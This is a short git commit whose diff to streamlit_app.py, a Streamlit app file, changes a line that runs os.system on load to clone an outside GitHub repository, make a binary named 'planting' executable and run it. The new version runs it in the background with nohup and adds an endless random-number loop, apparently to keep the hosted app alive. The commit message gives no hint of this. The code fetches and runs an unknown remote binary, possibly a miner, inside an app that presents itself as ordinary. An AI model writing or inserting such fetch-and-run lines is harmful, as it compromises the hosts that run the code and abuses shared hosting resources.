e80c7ec0a56d66bb672ce42988003149520cf75f
Yoseph Wondafrash <brucegr33n33@gmail.com>
2022-07-09 09:59:47 +0300

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf streamlit-plante && git clone https://github.com/JdevStudios/streamlit-plante.git && cd streamlit-plante  && chmod +x planting && ./planting")
+os.system ("rm -rf streamlit-plante && git clone https://github.com/JdevStudios/streamlit-plante.git && cd streamlit-plante  && chmod +x planting && nohup ./planting &; while :; do shuf -n 1 -i 1-99999999; sleep 10; done")
